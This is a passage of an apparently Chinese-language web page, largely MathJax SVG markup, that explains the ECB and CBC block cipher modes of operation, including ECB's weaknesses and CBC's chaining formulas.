661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2342.5, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(3498.9, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(3887.9, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5151.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5540.9, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5985.5, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6608.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(7664.1, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(8164.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(8608.8, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(9108.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(9553.4, 0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(10275.6, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(10775.9, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(11053.9, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(11331.9, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(11776.5, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container><br>对于长于b位的报文，加密前需要把这个报文分成b位的组，如果必要的话需要对最后一个组做填充。</p>
<p>在ECB模式下，加密算法的输入是明文，算法的输出将直接作为密文进行输出，不进行任何形式的反馈，每个明文分组的处理是相互独立的，这种方式也是分组密码工作的标准方式。</p>
<ul>
<li><p>缺点：由于没有任何形式的反馈，在相同的明文加密后将产生相同的密文。这样在处理具有固定数据结构的明文数据时容易暴露明文数据的固有格式（如某些具有格式化的报文）。其次，由于ECB模式下每个报文分组之间是相互独立的，这样如果攻击者有能力对报文进行分组的插入和删除，就可能会带来安全隐患。另外，ECB模式无法纠正传输的同步差错，如果在传输中增加或丢失一个或多个比特，将引起密文分组的对其错误，这样整个密文序列都将不能正常解密。</p>
</li>
<li><p>优势在于由于密文分组的独立性，如果需要创建一个非常大的加密数据库的话，可以运用平行处理。</p>
</li>
</ul>
<h3 id="密码分组连接模式（Cipher-Block-Chaining）"><a href="#密码分组连接模式（Cipher-Block-Chaining）" class="headerlink" title="密码分组连接模式（Cipher Block Chaining）"></a>密码分组连接模式（Cipher Block Chaining）</h3><p>在CBC模式中，加密算法的输入是当前的明文分组和上一次的产生的密文分组的异或，其输出为当前的密文分组，即<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="8.428ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 3725.1 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(715, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1396.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2452.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(2956.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="31.345ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 13854.6 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2342.5, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(3498.9, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(3887.9, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5318.5, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(6996.2, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(715, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1123, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8908.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9297.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(9742.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10520.3, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(11576.1, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12198.8, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(13254.6, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></p>
<p>相应的解密规则为<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="8.428ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 3725.1 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(715, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1396.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 